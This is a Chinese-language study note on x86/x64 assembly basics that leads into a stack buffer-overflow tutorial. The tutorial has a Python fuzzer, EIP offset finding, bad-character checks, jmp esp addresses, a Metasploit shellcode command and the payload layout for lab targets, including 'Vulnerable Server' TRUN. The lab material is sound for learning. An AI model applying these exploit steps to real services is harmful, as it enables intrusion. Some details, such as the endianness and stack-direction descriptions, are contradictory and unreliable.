prolog)\u662f\u51fd\u6570\u5f00\u59cb\u65f6\u7684\u6307\u4ee4\u5e8f\u5217\uff0c\u4e3a\u4e86EBP\u4e2d\u7684\u503c\u5728\u51fd\u6570\u6267\u884c\u671f\u95f4\u4fdd\u6301\u4e0d\u53d8\uff0c\u597d\u8ba9EBP\u53ef\u4ee5\u7528\u4e8e\u8bbf\u95ee\u5c40\u90e8\u53d8\u91cf\u548c\u53c2\u6570\u3002\u5b83\u901a\u5e38\u770b\u8d77\u6765\u50cf\u4e0b\u9762\u7684\u4ee3\u7801\u7247\u6bb5: push ebp mov ebp, esp sub esp, X \u51fd\u6570\u5c3e\u58f0\u91ca\u653e\u6808\u4e2d\u5206\u914d\u7684\u7a7a\u95f4\uff0c\u5c06EBP\u5bc4\u5b58\u5668\u4e2d\u7684\u503c\u8fd4\u56de\u5230\u5176\u521d\u59cb\u72b6\u6001\uff0c\u5e76\u5c06\u63a7\u5236\u6d41\u8fd4\u56de\u7ed9\u8c03\u7528\u8005 mov esp, ebp pop ebp ret 0 \u51fd\u6570\u5e8f\u8a00\u548c\u5c3e\u58f0\u901a\u5e38\u5728\u53cd\u6c47\u7f16\u7a0b\u5e8f\u4e2d\u68c0\u6d4b\uff0c\u7528\u4e8e\u51fd\u6570\u5b9a\u754c \u4e0b\u9762\u662f\u5728linux\u4e0a\u751f\u4ea7\u7684\u6c47\u7f16\u7801 \u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u53d8\u91cf \u5728\u6c47\u7f16\u4e2d\u5168\u5c40\u53d8\u91cf\u4f1a\u88ab\u81ea\u52a8\u521d\u59cb\u5316\u4e3a0\uff0c\u5c40\u90e8\u53d8\u91cf\u4e0d\u4f1a \u5bc4\u5b58\u5668 General Purpose Registers (GPR) RAX - accumulator register \u7d2f\u52a0\u5668\u5bc4\u5b58\u5668\u3002\u901a\u5e38\u7528\u4e8e\u5b58\u50a8\u51fd\u6570\u7684\u8fd4\u56de\u503c RBX - base register \u57fa\u7840\u5bc4\u5b58\u5668\u3002\u6709\u65f6\u7528\u4f5c\u5185\u5b58\u8bbf\u95ee\u7684\u57fa\u51c6\u6307\u9488 RDX - data register \u6570\u636e\u5bc4\u5b58\u5668 RCX - counter register \u6709\u65f6\u88ab\u79f0\u4e3a\u8ba1\u6570\u5668\u5bc4\u5b58\u5668\u3002\u7528\u4f5c\u5faa\u73af\u8ba1\u6570\u5668 RSI - source index \u88ab\u79f0\u4e3a\u6e90\u7d22\u5f15\u3002\u7528\u4e8e\u5b57\u7b26\u4e32\u64cd\u4f5c\u7684\u6e90\u6307\u9488\u3002 RDI - destination index \u79f0\u4e3a\u76ee\u6807\u7d22\u5f15\u3002\u5728\u5b57\u7b26\u4e32\u64cd\u4f5c\u4e2d\u7528\u4f5c\u76ee\u6807\u6307\u9488 RSP - stack pointer \u6808\u6307\u9488\u3002\u4fdd\u5b58\u6808\u9876\u90e8\u7684\u5730\u5740\u3002 RBP - base pointer \u57fa\u6307\u9488\u3002\u4fdd\u5b58\u5806\u6808\u5e95\u90e8\u7684\u5730\u5740\u3002 EIP/RIP - Instruction Pointer \u6307\u4ee4\u6307\u9488\u3002\u4fdd\u5b58\u4e0b\u4e00\u884c\u8981\u6267\u884c\u4ee3\u7801\u7684\u5730\u5740 \u4e0d\u540c\u4f4d\u6570\u7684\u5bc4\u5b58\u5668 CPU\u662f\u4e00\u6b65\u6b65\u8fdb\u5316\u800c\u6765\u7684\uff0c\u6240\u4ee5\u9488\u5bf9\u4e0d\u540c\u4f4d\u6570\u6709\u4e0d\u540c\u7684\u5bc4\u5b58\u5668\u3002 R\u5f00\u5934\u7684\u5bc4\u5b58\u5668\u662f64\u4f4d\u7a0b\u5e8f\u7684 \u5927\u5c0f8\u5b57\u8282 E\u5f00\u5934\u7684\u5bc4\u5b58\u5668\u662f32\u4f4d\u7a0b\u5e8f\u7684 \u5927\u5c0f4\u5b57\u8282 A\u5f00\u5934\u7684\u5bc4\u5b58\u5668\u662f16\u4f4d\u7a0b\u5e8f\u7684 \u5927\u5c0f2\u5b57\u8282 \u5728\u4e00\u4e2a64\u4f4d\u7a0b\u5e8f\u4e2d\uff0c\u540c\u65f6\u5b58\u572864\u4f4d\u300132\u4f4d\u300116\u4f4d\u30018\u4f4d\u5bc4\u5b58\u5668\u3002 \u6bd4\u5982\uff0c64\u4f4d\u4e2dRAX\u7684\u540e32\u4f4d\u4e3aEAX\uff0c\u540e16\u4f4d\u4e3aAX\uff0816\u4f4d\u4e3a\u9ad8\u4f4dAH\u548c\u4f4e\u4f4dAL\u7ec4\u6210\uff09 \u5b58\u50a8\u6d6e\u70b9\u6570\u7684\u5bc4\u5b58\u5668 \u6d6e\u70b9\u6570\u503c\u88ab\u5b58\u50a8\u5728 YMM* \u5bc4\u5b58\u5668\u4e2d\uff0c\u5bf9\u5e94\u768432\u4f4d\u5bc4\u5b58\u5668\u662f XMM* \u5b58\u50a8\u6574\u5f62\u7684\u5bc4\u5b58\u5668 R8 \u81f3 R15\u5bc4\u5b58\u5668\u7528\u6765\u5b58\u50a8\u6574\u5f62 \u5185\u5b58\u6570\u636e\u7ed3\u6784 \u5185\u5b58\u7ed3\u6784 Stack \u6808 Heap \u5806 .data \u5305\u542b\u521d\u59cb\u5316\u4e3a\u975e\u96f6\u503c\u7684\u5168\u5c40\u548c\u9759\u6001\u6570\u636e .bss \u5305\u542b\u672a\u521d\u59cb\u5316\u6216\u521d\u59cb\u5316\u4e3a\u96f6\u7684\u5168\u5c40\u548c\u9759\u6001\u6570\u636e .text \u5305\u542b\u7a0b\u5e8f\u7684\u4ee3\u7801 \u4e0a\u56fe\u7684\u4ecb\u7ecd \u6808 - \u5b58\u50a8\u56fa\u5b9a\u5927\u5c0f\u6570\u636e\uff0c\u540e\u8fdb\u5148\u51fa\u539f\u5219\uff0c\u5165\u6808RSP\u4f1a\u589e\u52a0\uff0c\u51fa\u6808RSP\u4f1a\u51cf\u5c0f\uff0cRBP\u59cb\u7ec8\u4e0d\u53d8 \u5806 - \u53ef\u53d8\u7684\u5b58\u50a8\u7a7a\u95f4 \u7a0b\u5e8f\u955c\u50cf - \u8f7d\u5165\u5230\u5185\u5b58\u4e2d\u7684PE\u6587\u4ef6 TEB - \u7ebf\u7a0b\u73af\u5883\u5757 PEB - \u8fdb\u7a0b\u73af\u5883\u5757 \u6808\u5e27 \u6808\u7684\u57fa\u7840\u5355\u5143 \u7aef\u5e8f \u4e00\u79cd\u5185\u5b58\u6570\u636e\u7684\u6392\u5217\u65b9\u5f0f\uff0c\u8fd9\u5c06\u5f71\u54cd\u5230\u8c03\u8bd5\u8fc7\u7a0b\u4e2d\u770b\u5230\u5185\u5b58\u7684\u6570\u636e\u987a\u5e8f\u95ee\u9898\uff0c\u9ed8\u8ba4\u662f\u91c7\u7528\u5c0f\u7aef\u5e8f\u6765\u5728\u5185\u5b58\u4e2d\u5b58\u50a8\u6570\u636e\u7684\uff0c\u8fd9\u4e5f\u5c31\u662f\u4e3a\u4ec0\u4e48\u5728\u5185\u5b58\u4e2d\u770b\u5230\u7684\u6570\u636e\u548c\u5b9e\u9645\u7684\u6570\u636e\u662f\u76f8\u53cd\u7684 \u5927\u7aef\u5e8f\uff1a \u5c0f\u503c\u5b58\u9ad8\u4f4d\uff0c\u5927\u503c\u5b58\u4f4e\u4f4d \u5c0f\u7aef\u5e8f\uff1a \u5927\u503c\u5b58\u4f4e\u4f4d\uff0c\u5c0f\u503c\u5b58\u9ad8\u4f4d \u6808 \u6808\u7684\u589e\u957f\u662f\u4ece\u5927\u5230\u5c0f\u7684\uff0c\u6808\u5e95\u662f\u5927\u5730\u5740\uff0c\u6808\u9876\u662f\u5c0f\u5730\u5740\u3002\u5165\u6808\u4f1a\u51cf\u5c0f\u6808\u9876\u5730\u5740\uff0c\u51fa\u6808\u4f1a\u589e\u5927\u6808\u9876\u5730\u5740\u3002 \u4f7f\u7528\u65e0\u9650\u5faa\u73af\u9012\u5f52\u4f1a\u5bfc\u81f4\u6808\u6ea2\u51fa void main() { main(); } \u7f16\u8bd1\u5668\u5173\u95ed\u4f18\u5316 RSP\u5230\u6700\u5c0f\u503c\u4e86 \u6307\u4ee4 \u76f4\u63a5\u503c\u3001\u5bc4\u5b58\u5668\u3001\u5185\u5b58/\u5185\u5b58\u5730\u5740 \u6c47\u7f16\u6307\u4ee4\u7684\u683c\u5f0f \u64cd\u4f5c\u7b26 \u76ee\u6807,\u6e90 mov RAX, 5 \u5206\u53f7 ; \u540e\u9762\u4ee3\u8868\u6ce8\u91ca \u5e38\u89c1\u6307\u4ee4 MOV - \u5c06\u6e90\u64cd\u4f5c\u6570\u79fb\u52a8/\u5b58\u50a8\u5230\u76ee\u6807\u64cd\u4f5c\u6570 LEA - Load Effective Address \u52a0\u8f7d\u6709\u6548\u5730\u5740\uff0c\u4e0eMOV\u529f\u80fd\u76f8\u540c\uff0c\u5e38\u7528\u6765\u8ba1\u7b97\u5730\u5740 POSH - \u5165\u6808 POP - \u51fa\u6808 INC - \u52a01 DEC - \u51cf1 ADD - \u76f8\u52a0\uff0cadd RAX, RBX \u53ef\u4ee5\u770b\u6210 RAX += RBX SUB - \u76f8\u51cf\uff0csub RAX, RBX \u53ef\u4ee5\u770b\u6210 RAX -= RBX MUL/IMUL - \u76f8\u4e58\uff0cMUL\u662f\u65e0\u7b26\u53f7\u7ed3\u679c\uff0cIMUL\u662f\u6709\u7b26\u53f7\u7ed3\u679c DIV/IDIV - \u76f8\u9664\uff0c\u65e0\u7b26\u53f7\u548c\u6709\u7b26\u53f7 AL - eax\u7684\u4f4e8\u4f4d TEST - \u6309\u4f4d\u8fdb\u884cAND\u64cd\u4f5c\uff0c\u6839\u636e\u8fd0\u7b97\u7ed3\u679c\u8bbe\u7f6e\u7b26\u53f7\u6807\u5fd7\u4f4d\u3001\u96f6\u6807\u5fd7\u4f4d\u548c\u5947\u5076\u6807\u5fd7\u4f4d CMP - \u6bd4\u8f83\uff0c\u5b9e\u9645\u4e0a\u662f\u51cf\u6cd5SUB\uff0c\u4e0d\u540c\u7684\u662fSUB\u4f1a\u6539\u53d8\u76ee\u6807\u503c\uff0c\u800cCMP\u4e0d\u4f1a\uff0cCMP\u6539\u53d8\u7684\u662f\u6807\u5fd7\u4f4d\u3002\u5982CMP RAX, RCX \u5219\u662fRAX=RAX-RCX\uff0c\u5bf9\u6807\u5fd7\u4f4dZF\u3001SF\u3001CF/OF\u4ea7\u751f\u5f71\u54cd RET - \u5feb\u901f\u8fd4\u56de NOP - \u586b\u5145\u7b26 JB - \u65e0\u7b26\u53f7\u8ba1\u7b97\uff0c\u6839\u636e\u6807\u5fd7\u4f4d\u8df3\u8f6c JL - \u6709\u7b26\u53f7\u8ba1\u7b97\uff0c\u5c0f\u4e8e\u8df3\u8f6c\u3002\u6807\u5fd7\u4f4d\u8df3\u8f6c\uff0cSF<>OF\u8df3\u8f6c JLE - \u5c0f\u4e8e\u7b49\u4e8e\u8df3\u8f6c\u3002\u770b\u6807\u5fd7\u4f4d\u65f6\uff0cZF=1 \u6216 SF<>OF\u65f6 \u8df3\u8f6c JE - \u7b49\u4e8e\u8df3\u8f6c\uff0cZF\u4e3a1\u8df3\u8f6c TEST - \u5728\u4e24\u4e2a\u64cd\u4f5c\u6570\u7684\u5bf9\u5e94\u4f4d\u4e4b\u95f4\u8fdb\u884c AND \u64cd\u4f5c\uff0c\u5e76\u6839\u636e\u8fd0\u7b97\u7ed3\u679c\u8bbe\u7f6e\u7b26\u53f7\u6807\u5fd7\u4f4d\u3001\u96f6\u6807\u5fd7\u4f4d\u548c\u5947\u5076\u6807\u5fd7\u4f4d\u3002 movsxd - \u5e26\u7b26\u53f7\u6570\u7684\u6269\u5c55\u3002\u5f80\u5f80\u662f\u4e3a\u4e86\u4ece\u4f4e\u4f4d\u5f80\u9ad8\u4f4d\u6269\u5c55\u65f6\u9700\u8981\uff0c16\u4f4d\u6269\u5c55\u523032\u4f4d JCC - \u662f\u4e00\u7ec4\u6307\u4ee4\uff0c\u6839\u636e\u6807\u5fd7\u4f4dZF\u5224\u65ad\u662f\u5426\u8df3\u8f6c\uff0c\u5305\u542bJNE\u3001JLE\u3001JNZ\u7b49\u3002\u662f\u7528\u6765\u6bd4\u8f83\u5927\u5c0f\u7684\uff0c\u4f46\u662f\u5185\u90e8\u903b\u8f91\u662fSUB\uff0c\u7136\u540e\u6839\u636e\u6807\u5fd7\u4f4d\u8df3\u8f6c\uff0c\u8be6\u7ec6\u89c1\u4e0b\u56fe \u4e0b\u9762\u662f\u6709\u7b26\u53f7\u6570\u7684\u64cd\u4f5c\uff0c\u5373\u5305\u542b\u8d1f\u6570\u6bd4\u8f83 JNE - \u76ee\u6807\u4e0d\u7b49\u4e8e\u6e90\u65f6\u8df3\u8f6c\u3002\u5224\u65ad\u662f\u5426ZF\u662f\u5426\u7b49\u4e8e1\uff0cZF\u4e3a1\u5219\u7ee7\u7eed\uff0c\u4e3a0\u5219\u8df3\u8f6c JLE - \u76ee\u6807\u5c0f\u4e8e\u7b49\u4e8e\u6e90\u65f6\u8df3\u8f6c JGE - \u76ee\u6807\u5927\u4e8e\u7b49\u4e8e\u6e90\u65f6\u8df3\u8f6c \u4e0b\u9762\u662f\u65e0\u7b26\u53f7\u6570\u7684\u64cd\u4f5c\uff0c\u5373\u4e0d\u5305\u542b\u8d1f\u6570\u6bd4\u8f83 JBE - \u5c0f\u4e8e\u7b49\u4e8e\u8df3\u8f6c\uff0cCF=1\u6216ZF=1\u8df3\u8f6c JAE - \u5927\u4e8e\u7b49\u4e8e\u8df3\u8f6c\uff0c CALL - \u51fd\u6570\u8c03\u7528\uff0c\u76f8\u5f53\u4e8ePUSH\u540eJMP RET - \u51fd\u6570\u8fd4\u56de\uff0c \u76f8\u5f53\u4e8ePOP\u540eJMP JMP - \u8df3\u8f6c\u6307\u4ee4 JMP\u7684\u6307\u4ee4\u7684\u503c\u4ee5EB\u5f00\u5934\uff0cEB\u540e\u9762\u4ee3\u8868\u8df3\u8f6c\u7684\u4f4d\u7f6e\uff0c\u4fee\u6539EB\u540e\u9762\u7684\u503c\u4e3a00\u53ef\u4ee5\u8ba9JMP\u4e0d\u8df3\u8f6c\u800c\u7ee7\u7eed\u6267\u884c\u4e0b\u4e00\u6761\u6307\u4ee4 cdqe - \u6269\u5c55eax\u5230rax\uff0c\u4ece32\u4f4d\u6269\u5c55\u523064\u4f4d \u6307\u4ee4\u4e2d\u7684\u6307\u9488 \u65b9\u62ec\u53f7 [] \u4e2d\u7684\u6570\u636e\u4ee3\u8868\u7684\u662f\u4e00\u4e2a\u5730\u5740\uff0c\u4f7f\u7528 LEA \u6765\u5bf9\u5730\u5740\u8fdb\u884c\u64cd\u4f5c lea RAX, [RCX+8] ;\u8fd9\u662f\u8ba1\u7b97\u5730\u5740\u7684 mov RAX, [RCX+8] ;\u8fd9\u662f\u8ba1\u7b97\u503c\u7684 \u6807\u5fd7\u4f4d ZF - Zero Flag \u5728\u64cd\u4f5c\u7ed3\u679c\u4e3a\u96f6\u65f6\u8bbe\u7f6e\u4e3a1\u3002\u5982\u679c\u64cd\u4f5c\u7684\u7ed3\u679c\u4e0d\u4e3a\u96f6\uff0c\u5219\u4e0d\u8bbe\u7f6e CF - Carry Flag \u65e0\u7b26\u53f7\u6570\u503c\uff0c\u4ea7\u751f\u501f\u4f4d\u548c\u8fdb\u4f4d\u65f6\uff0c\u8bbe\u7f6e\u4e3a1 OF - Overflow Flag \u6709\u7b26\u53f7\u6570\u503c\uff0c\u4ea7\u751f\u501f\u4f4d\u548c\u9519\u4f4d\u65f6\uff0c\u8bbe\u7f6e\u4e3a1 SF - Sign Flag \u64cd\u4f5c\u7ed3\u679c\u4e3a\u8d1f\u6570\u65f6\uff0c\u8bbe\u7f6e\u4e3a1 AF? - Adjust/Auxiliary Flag \u4e0eCF\u76f8\u540c\uff0c\u4f46\u7528\u4e8eBCD\u64cd\u4f5c\uff08BCD\u64cd\u4f5c\u662f\u4ec0\u4e48\u64cd\u4f5c\uff09 PF - Parity Flag \u5982\u679c\u540e8\u4f4d\u4e2d\u76841\u662f\u5076\u6570\u4f4d\uff0c\u5219\u8bbe\u7f6e\u4e3a1 TF - Trap Flag \u4e3a1\u65f6\uff0c\u5141\u8bb8\u5355\u6b65\u6267\u884c\u7a0b\u5e8f DF - \u53c2\u8003\u8d44\u6599\uff1a https://www.tech-recipes.com/rx/1239/assembly-flags/ \u6c47\u7f16\u4e2d\u7684\u6d41\u7a0b\u63a7\u5236 case \u901a\u8fc7jmp\u8df3\u8f6cecx*4\u7684\u5730\u5740\uff0c\u6839\u636e$LN11@f\u4e2d\u4e0d\u540c\u8868\u7684\u503c\u8fdb\u884c\u5206\u652f\u9009\u62e9 For\u5faa\u73af for\u5faa\u73af\u4e00\u5b9a\u6709\u4e00\u4e2a\u88ab\u521d\u59cb\u5316\u7684\u503c\u4f5c\u4e3a\u7d22\u5f15\uff0c\u901a\u5e38\u88ab\u8d4b\u7ed9ESI\uff0c\u7136\u540e\u6bd4\u8f83ESI\u548c\u53e6\u5916\u4e00\u4e2a\u503c\uff0c\u5e76\u4f1a\u8df3\u8f6c\u56de\u53bb \u6c47\u7f16\u4e2d\u7684\u7b97\u672f \u4e58\u6cd5\u901a\u5e38\u7528\u52a0\u6cd5\u3001\u51cf\u6cd5\u548c\u5de6\u79fb\u6765\u66ff\u4ee3 \u5de6\u79fb\u7684\u539f\u7406\u662f\uff0c\u5f53\u88ab\u4e58\u6570\u80fd\u88ab2\u9664\u5c3d\u65f6\uff0c\u53ea\u9700\u8981\u518d\u6700\u53f3\u8fb9\u52a0\u4e0a[\u88ab\u9664\u6570/2]\u6570\u91cf\u76840\u5373\u53ef\uff0c\u88ab\u9664\u6570\u662f2\u30014\u30018\u300116\u300132....\u8fd9\u4e9b\u6570\u5b57\u65f6\u53ef\u4ee5\u4f7f\u7528\u5de6\u79fb\u66ff\u4ee3\u4e58\u6cd5 \u9664\u6cd5\u4e5f\u662f\u7c7b\u4f3c\uff0c\u4f46\u662f\u662f\u53f3\u79fb\u4e14\u4f4e\u4f4d\u88ab\u4e22\u5f03 \u6c47\u7f16\u4e2d\u7684\u6d6e\u70b9\u6570 x86\u4e2d\u7684\u6d6e\u70b9\u6570\u7531FPU\u6765\u5b8c\u6210\u5904\u7406\uff0cST(0)\u2026ST(7)\uff0c\u6709\u4e00\u7ec4\u53ef\u4ee5\u5bb9\u7eb38*80\u5b57\u8282\u7684\u6808 \u7f13\u51b2\u533a\u6ea2\u51fa vscode\u7684\u9009\u9879\u4f1a\u9632\u6b62\u7f13\u51b2\u533a\u6ea2\u51fa /rtc\u5806\u6808\u5e27\u8fd0\u884c\u65f6\u68c0\u67e5 /GZ\u542f\u7528\u5806\u6808\u68c0\u67e5(/ rtc) \u6570\u7ec4\u8d8a\u754c\u8bfb\u53d6 #include <stdio.h> int main() { int a[20]; int i; for (i=0; i<20; i++) a[i]=i*2; printf (\"a[20]=%d\\n\", a[20]); //\u5f53a\u6570\u7ec4\u7684\u7d22\u5f15\u8fd8\u6ca1\u523020\u65f6\uff0c\u8fd9\u91cc\u5c31\u8bfb\u53d6\u4e8620 return 0; }; \u4f7f\u7528cl\u76f4\u63a5\u7f16\u8bd1\uff0c\u7a0b\u5e8f\u8fd0\u884c\u7ed3\u679c\u662f a[20]=1175513387 4610E92B \u6570\u7ec4\u8d8a\u754c\u5199\u5165 #include <stdio.h> int main() { int a[20]; int i; for (i=0; i<30; i++) //\u8fd9\u91cc\u5faa\u73af\u7d22\u5f15\u6700\u5927\u662f29 a[i]=i; //\u5faa\u73af\u7d22\u5f15\u8d4b\u7ed9\u4e86\u6570\u7ec4\u7684\u7d22\u5f15\uff0c\u5faa\u73af\u7d22\u5f15\u5927\u4e8e\u6570\u7ec4\u7d22\u5f15\uff0c\u5bfc\u81f4\u8d8a\u754c\u5199\u5165\u3002\u6839\u672c\u4e0d\u5b58\u5728a[29]\uff0c\u8981\u5982\u4f55\u7ed9a[29]\u8d4b\u503c\u5462\uff1f return 0; }; \u4e00\u76f4\u5199\u5165\u4e8629\u4e2a\u503c\u5230\u6808\u4e2d\uff0c\u4f46\u662f\u7a0b\u5e8f\u4f1a\u5728\u5c1d\u8bd5\u5f80\u6570\u7ec4\u5199\u5165a[21]\u65f6\u4ea7\u751f\u5f02\u5e38 \u8d8a\u754c\u5199\u5165\u5229\u7528 \u5f71\u54cd\uff1a\u8d8a\u754c\u5199\u5165\u53ef\u9020\u6210RCE \u4e00\u4e2a\u57fa\u7840\u7684\u8d8a\u754c\u5199\u5165\u7f13\u5b58\u6ea2\u51fa\u5229\u7528\u6b65\u9aa4 1. \u627e\u5230\u89e6\u53d1\u7f13\u5b58\u6ea2\u51fa\u7684\u70b9\uff0c\u4e5f\u5c31\u662f\u627e\u5230\u53ef\u5bf9ESP\u64cd\u4f5c\u7684\u8f93\u5165\u70b9 2. \u627e\u5230EIP\u7684\u504f\u79fb\u4f4d\u7f6e\u4ee5\u4fbf\u4fee\u6539EIP 3. \u627e\u5230\u53ef\u91cd\u5b9a\u5411\u4ee3\u7801\u6267\u884c\u6d41\u7684\u6307\u4ee4\u7684\u5730\u5740(jmp esp\u3001ret esp\u7b49) 4. \u5c06EIP\u7684\u503c\u66ff\u6362\u4e3a\u91cd\u5b9a\u5411\u4ee3\u7801\u6267\u884c\u6d41\u8bed\u53e5\u7684\u5730\u5740 5. \u627e\u5230\u7a0b\u5e8f\u7684\u574f\u5b57\u7b26 6. \u6784\u9020\u6ca1\u6709\u574f\u5b57\u7b26\u7684shellcode,\u5728shellcode\u524d\u7528\u6570\u4e2anop\u586b\u5145\u9632\u6b62\u91cd\u5b9a\u5411\u6307\u4ee4\u8df3\u8fc7\u754c 7. \u53d1\u9001payload \u7ec3\u4e60A \u627e\u5230\u53ef\u63a7\u8f93\u5165\u70b9\u7684\u6ea2\u51fa\u8fb9\u754c \u7b2c\u4e00\u6b65\u9700\u8981\u641e\u6e05\u695a\u591a\u5c11\u5b57\u8282\u4f1a\u9020\u6210\u6ea2\u51fa\uff0c\u6ea2\u51fa\u7684\u8fb9\u754c\u5728\u54ea\u3002 \u8fd9\u91cc\u7528\u4e00\u4e2a\u7b80\u5355\u7684\u63a7\u5236\u53f0\u7a0b\u5e8f\u6765\u4f5c\u4e3a\u7ec3\u4e60\u3002 \u7528\u811a\u672c\u81ea\u52a8\u5316\u6d4b\u8bd5\u8fd9\u4e2a\u8f93\u5165\u70b9\u53ef\u4ee5\u63a5\u6536\u591a\u5927\u5b57\u8282\u7684\u6570\u636e import socket import sys ip = \"192.168.14.139\" port = 31337 string = b\"\\xfc\" * 10 s = socket.socket() s.connect((ip, port)) timeout = 3 s.settimeout(timeout) while True: try: print(\"Fuzzing with {} bytes\".format(len(string))) s.send(string + b\"\\x0a\\x0d\") string += b\"\\xfc\" * 10 s.recv(1024) except: print(\"Fuzzer crashed at {} bytes\".format(len(string))) sys.exit(0) s.close() \u8dd1\u5230160\u5b57\u8282\u65f6\u7a0b\u5e8f\u5d29\u6e83 \u627e\u5230EIP\u7684\u504f\u79fb\u91cf EIP/RIP\u5bc4\u5b58\u5668\u662f\u6307\u4ee4\u6307\u9488\uff0c\u4fdd\u5b58\u4e86\u4e0b\u4e00\u884c\u8981\u6267\u884c\u4ee3\u7801\u7684\u5730\u5740\u3002 \u7531\u4e8e\u662f160\u5b57\u8282\u7a0b\u5e8f\u4ea7\u751f\u4e86\u5d29\u6e83\uff0c\u76f4\u63a5\u81ea\u5b9a\u4e49\u4e00\u6bb5300\u5b57\u8282\u7684\u6570\u636e\u53d1\u9001\uff0c\u901a\u8fc7\u7a0b\u5e8f\u5d29\u6e83\u65f6EIP\u7684\u503c\u6765\u627e\u5230EIP\u7684\u504f\u79fb\u91cf \u6b64\u65f6EIP\u7684\u503c\u4e3a39654138 \u2514\u2500# msf-pattern_offset -l 300 -q 39654138 [*] Exact match at offset 146 \u504f\u79fb\u91cf\u662f146\u5b57\u8282\uff0c\u4e5f\u5c31\u662f\u8bf4\u8f93\u5165\u70b9\u7684\u6700\u5927\u8f93\u5165\u662f146\u4e2a\u5b57\u8282\uff0c\u5728\u6b64\u4e4b\u540e\u662fEIP\u7684\u5730\u5740\u3002\u6b64\u65f6\u53d1\u9001146\u4e2a\u5b57\u8282\uff0c\u5e76\u5728\u540e\u9762\u8ddf\u4e0a4\u4e2a\u5b57\u8282\uff0c\u5c31\u53ef\u4ee5\u63a7\u5236EIP\u7684\u503c\u3002 \u7531\u4e8e\u6211\u5728146\u4e2a\u5b57\u8282\u540e\u53d1\u9001\u4e864\u4e2a Z \uff0c\u8fd9\u91cc\u7684EIP\u503c\u662f 5A5A5A5A \u67e5\u627e\u574f\u5b57\u7b26 \u4e3a\u4ec0\u4e48\u8981\u67e5\u627e\u574f\u5b57\u7b26? \u8fd9\u662f\u56e0\u4e3a\u6bcf\u4e2a\u7a0b\u5e8f\u7684\u8f93\u5165\u70b9\u5224\u65ad\u4e0d\u4e00\u6837\uff0c\u6bd4\u5982\u6709\u7684\u8f93\u5165\u70b9\u53ea\u5141\u8bb8\u8f93\u5165\u6570\u5b57\uff0c\u6709\u7684\u7a0b\u5e8f\u4e0d\u5141\u8bb8\u8f93\u5165\u5b57\u7b26\u3002\u9700\u8981\u627e\u5230\u8fd9\u4e9b\u7a0b\u5e8f\u4e0d\u6b63\u5e38\u5904\u7406\u7684\u574f\u5b57\u7b26\uff0c\u7528\u8fd9\u4e9b\u574f\u5b57\u7b26\u4e4b\u5916\u7684\u5b57\u7b26\u6765\u751f\u6210shellcode\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u7a0b\u5e8f\u56e0\u4e3a\u5f02\u5e38\u800c\u7ec8\u6b62\u3002 \u5728EIP\u4e4b\u540e\u53d1\u9001\u6240\u6709\u5b57\u7b26\u6765\u6d4b\u8bd5\u574f\u5b57\u7b26 \u57280x09\u540e\u76840x0a\u53d8\u6210\u4e860x00\uff0c0x0a\u662f\u4e00\u4e2a\u574f\u5b57\u7b26\u3002 \u53bb\u63890x0a\u540e\u91cd\u65b0\u53d1\u9001\uff0c\u5faa\u73af\u6b64\u6b65\u9aa4\u4ee5\u627e\u5230\u6240\u6709\u7684\u574f\u5b57\u7b26 \u91cd\u5b9a\u5411\u6267\u884c\u6d41 \u8fd9\u662fshellcode\u88ab\u6267\u884c\u7684\u5173\u952e\u4e00\u6b65\u3002 \u627e\u5230\u7a0b\u5e8f\u4e2d\u5b58\u5728\u7684 jmp esp \u6216\u8005 call esp \u53ef\u4ee5\u8ba9\u7a0b\u5e8f\u8df3\u5230esp\u7684\u4f4d\u7f6e\u91cd\u65b0\u6267\u884c\uff0c\u4ee5\u4fbf\u8ba9shellcode\u88ab\u6267\u884c \u901a\u8fc7\u5339\u914d\u7279\u5f81\u627e\u5230\u4e864\u4e2a jmp esp \u5730\u5740\u5206\u522b\u662f f7552677 85102177 c3c12177 f2131f77 \u5c06 EIP \u7684\u503c\u66ff\u6362\u4e3a f7552677 \u4fbf\u53ef\u4ee5\u8ba9\u7a0b\u5e8f\u91cd\u65b0\u6267\u884cESP\u5730\u5740\u7684\u4ee3\u7801 \u63a5\u7740\u9700\u8981\u5728 jmp esp \u540e\u9762\u63d2\u5165 nop \uff0c\u786e\u4fddjmp\u4e4b\u540e\u4f1a\u6267\u884c\u5230shellcode \u751f\u6210shellcode \u8981\u6ce8\u610f\u7684 shellcode\u4e0d\u80fd\u6709\u574f\u5b57\u7b26 shellcode\u9000\u51fa\u7ebf\u7a0b,\u4e0d\u80fd\u9000\u51fa\u8fdb\u7a0b \u4f7f\u7528msf\u751f\u6210shellcode generate EXITFUNC=thread -b \"\\x00\\x0a\" \u6b64\u65f6\u5b8c\u6574payload\u662f 146\u5b57\u8282\u968f\u673a\u5b57\u7b26 + 0xf7552677 + 8\u5b57\u8282nop + shellcode \u7ec3\u4e60B \u7a0b\u5e8f\u8fd0\u884c\u540e\u7684\u6837\u5b50 C:\\>nc 192.168.14.139 9999 Welcome to Vulnerable Server! Enter HELP for help. HELP Valid Commands: HELP STATS [stat_value] RTIME [rtime_value] LTIME [ltime_value] SRUN [srun_value] TRUN [trun_value] GMON [gmon_value] GDOG [gdog_value] KSTET [kstet_value] GTER [gter_value] HTER [hter_value] LTER [lter_value] KSTAN [lstan_value] EXIT \u67d0\u4e2a\u547d\u4ee4\u7684\u67d0\u4e9b\u5b57\u7b26\u4e32\u4f1a\u5bfc\u81f4\u7f13\u5b58\u6ea2\u51fa TRUN \u547d\u4ee4\u540e\u8ddf /. \uff0c\u4e4b\u540e\u7684\u5b57\u7b26\u4e32\u5230\u4e00\u5b9a\u6570\u91cf\u540e\u4f1a\u89e6\u53d1\u6ea2\u51fa GMON\u4e5f\u5b58\u5728\u76f8\u540c\u95ee\u9898,\u6ea2\u51fa\u5230EBP,\u6ea2\u51fa\u4e0d\u5230EIP KSTET\u4e5f\u5b58\u5728\u6ea2\u51fa,\u53ef\u8986\u76d6EIP,\u8986\u76d6\u4e0d\u4e86\u6808 GTER\u4e5f\u5b58\u5728\u6ea2\u51fa,\u53ef\u6ea2\u51fa\u5230EIP.\u4f46\u6d4b\u8bd5\u4e4b\u540e\u53d1\u73b0\u6ea2\u51fa\u540e\u7684\u53ef\u63a7\u7a7a\u95f4\u4e0d\u8db3 \u8fd8\u662f\u7528TRUN\u6d4b\u8bd5 \u6d4b\u8bd5EIP\u504f\u79fb\u91cf \u6d4b\u8bd5\u574f\u5b57\u7b26,\u6ca1\u6709\u53d1\u73b00x00\u5916\u7684\u574f\u5b57\u7b26 \u6700\u7ec8\u7684payload\u662f eip = \"\\xaf\\x11\\x50\\x62\" 